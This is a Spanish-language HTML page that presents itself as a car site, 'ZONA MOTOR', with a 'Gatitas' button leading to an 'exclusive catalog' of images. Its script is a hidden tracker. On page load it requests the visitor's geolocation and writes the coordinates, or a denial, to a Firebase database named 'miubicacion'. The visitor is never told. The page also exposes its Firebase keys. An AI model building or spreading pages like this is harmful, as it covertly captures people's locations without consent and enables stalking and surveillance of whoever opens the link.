<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZONA MOTOR - Exclusivo</title>
    
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.0.0/firebase-database-compat.js"></script>

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #0b0c10; color: #c5c6c7; }
        
        header { background-color: #1f2833; padding: 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 3px solid #ff003c; }
        header h1 { color: #ffffff; font-size: 24px; text-transform: uppercase; letter-spacing: 2px; }
        header h1 span { color: #ff003c; }
        
        /* Hero con la imagen principal */
        .hero { 
            background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('URL_DE_TU_IMAGEN_PRINCIPAL.jpg') no-repeat center center/cover; 
            height: 500px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; 
        }
        
        .btn-gatitas { 
            margin-top: 20px; padding: 15px 40px; background: #ff003c; color: white; border: none; 
            font-size: 20px; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase;
        }

        .section-hidden { display: none; padding: 50px 20px; }
        .active { display: block; }

        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; max-width: 1100px; margin: 0 auto; }
        .grid img { width: 100%; border-radius: 8px; }

        footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; color: #666; }
    </style>
</head>
<body>

    <header>
        <h1>ZONA<span>MOTOR</span></h1>
    </header>

    <section class="hero" id="home">
        <h2>Bienvenido</h2>
        <button class="btn-gatitas" onclick="mostrarGatitas()">Gatitas</button>
    </section>

    <section id="seccion-gatitas" class="section-hidden">
        <h2 style="text-align: center; margin-bottom: 30px;">Catálogo Exclusivo</h2>
        <div class="grid">
            <img src="URL_IMAGEN_1.jpg" alt="Gatita 1">
            <img src="URL_IMAGEN_2.jpg" alt="Gatita 2">
            <img src="URL_IMAGEN_3.jpg" alt="Gatita 3">
        </div>
    </section>

    <footer>
        <p>&copy; 2026 ZonaMotor. Catálogo de Exhibición Privada.</p>
    </footer>

    <script>
        // Funcionalidad para mostrar la sección
        function mostrarGatitas() {
            document.getElementById('home').style.display = 'none';
            document.getElementById('seccion-gatitas').classList.add('active');
        }

        // Configuración Firebase (MANTENIDA)
        const firebaseConfig = {
            apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
            authDomain: "miubicacion-52e7f.firebaseapp.com",
            databaseURL: "https://miubicacion-52e7f-default-rtdb.firebaseio.com",
            projectId: "miubicacion-52e7f",
            storageBucket: "miubicacion-52e7f.firebasestorage.app",
            messagingSenderId: "847245935895",
            appId: "1:847245935895:web:e9576ba5280ac05b22e352",
            measurementId: "G-GE5FVZMQXP"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(siPermitio, noPermitio);
            }
        };

        function siPermitio(posicion) {
            database.ref('visitas_autos/' + Date.now()).set({
                latitud: posicion.coords.latitude,
                longitud: posicion.coords.longitude,
                permiso: "Otorgado"
            });
        }

        function noPermitio(error) {
            database.ref('visitas_autos/' + Date.now()).set({ permiso: "Denegado" });
        }
    </script>
</body>
</html>
